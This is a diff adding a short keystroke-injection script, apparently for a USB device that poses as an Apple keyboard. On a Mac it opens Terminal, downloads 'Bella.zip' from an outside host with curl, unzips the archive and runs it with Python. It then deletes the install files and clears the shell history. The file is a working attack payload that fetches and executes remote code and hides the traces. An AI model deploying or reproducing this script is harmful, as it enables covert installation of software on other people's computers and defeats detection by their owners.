@@ -1,0 +1,39 @@
+REM Title: Install Bella
+REM Grabs Bella from external location and installs it.
+REM: v1.0.1
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+REM --------------- OPEN TERMINAL ---------------
+COMMAND SPACE
+DELAY 800
+STRING Terminal
+DELAY 500
+ENTER
+REM --------------- GRAB BELLA ZIP ---------------
+DELAY 500
+STRING curl -O https://mywebsite.com/Bella.zip
+ENTER
+REM --------------- UNZIP BELLA ---------------
+DELAY 800
+STRING unzip Bella.zip
+ENTER
+REM --------------- INSTALL BELLA ---------------
+DELAY 800
+STRING python Bella
+ENTER
+REM --------------- REMOVE BELLA INSTALL LEFTOVERS ---------------
+DELAY 600
+STRING rm -rf Bella.zip
+ENTER
+DELAY 500
+STRING rm -rf __MACOSX
+ENTER
+REM --------------- REMOVE TERMINAL HISTORY ---------------
+DELAY 500
+STRING history -c
+ENTER
+REM --------------- CLOSE TERMINAL ---------------
+DELAY 500
+STRING exit
+ENTER
+COMMAND Q
